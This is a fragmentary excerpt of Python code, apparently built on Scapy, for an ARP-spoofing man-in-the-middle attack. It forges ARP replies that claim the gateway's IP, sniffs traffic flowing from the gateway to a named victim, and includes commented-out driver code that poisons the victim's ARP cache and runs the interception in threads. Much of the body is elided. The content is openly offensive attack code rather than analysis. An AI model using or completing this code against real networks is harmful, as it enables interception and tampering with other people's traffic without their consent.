...
###### Find gwIP - returns gw ip as a string #######
# def GW_IP_FINDER():
...
def ArpReplyGen(gw_ip ,attack_mac , victim_mac , victim_ip):
    ...
    arp_packet[ARP].psrc = gw_ip      ### set src ip to gw ip
...
def gw2victim(default_gw_mac,gw_ip ,attack_mac , victim_mac , victim_ip, seconds_to_run):
    sniff(filter = f"dst host {victim_ip} and src host {gw_ip}",prn=lambda packet: \
        GW_TO_Victim_handler(packet, default_gw_mac, gw_ip ,attack_mac , victim_mac , victim_ip),timeout=seconds_to_run)
...
#     default_gw_mac = GetMAC_ByIP(gw_ip)

#     ### send arp response to the victim, telling him that the mac of the default gw is "attack mac" ###

#     ##create arp response packets for vistim and gw:
...
#     t1 = threading.Thread(target=gw2victim, args=(default_gw_mac,gw_ip,attack_mac,victim_mac,victim_ip,seconds_to_run))
